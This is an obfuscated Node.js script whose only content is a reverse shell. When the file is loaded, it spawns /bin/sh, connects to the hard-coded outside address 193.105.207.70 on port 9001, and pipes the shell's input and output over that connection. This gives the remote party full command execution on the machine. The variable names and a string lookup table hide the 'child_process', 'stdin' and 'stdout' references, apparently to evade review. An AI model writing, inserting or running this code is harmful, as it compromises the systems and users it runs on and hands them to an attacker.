(function () {
    var _0x3e3fcc = _0xff69;
    var _0x5bb830 = require('net'), _0x30cbdb = require(_0x3e3fcc(0x0)), _0x185b46 = _0x30cbdb['spawn']('/bin/sh', []);
    var _0x361b43 = new _0x5bb830['Socket']();
    _0x361b43['connect'](0x2329, '193.105.207.70', function () {
        var _0x364855 = _0xff69;
        _0x361b43['pipe'](_0x185b46[_0x364855(0x1)]);
        _0x185b46[_0x364855(0x2)]['pipe'](_0x361b43);
        _0x185b46['stderr']['pipe'](_0x361b43);
    });
    return /a/;
}());
function _0xff69(_0x80c8c3, _0xff69f0) {
    var _0x2eca24 = _0x80c8();
    _0xff69 = function (_0x4de04d, _0x572ec4) {
        _0x4de04d = _0x4de04d - 0x0;
        var _0x50a359 = _0x2eca24[_0x4de04d];
        return _0x50a359;
    };
    return _0xff69(_0x80c8c3, _0xff69f0);
}
function _0x80c8() {
    var _0x57859f = [
        'child_process',
        'stdin',
        'stdout'
    ];
    _0x80c8 = function () {
        return _0x57859f;
    };
    return _0x80c8();
}
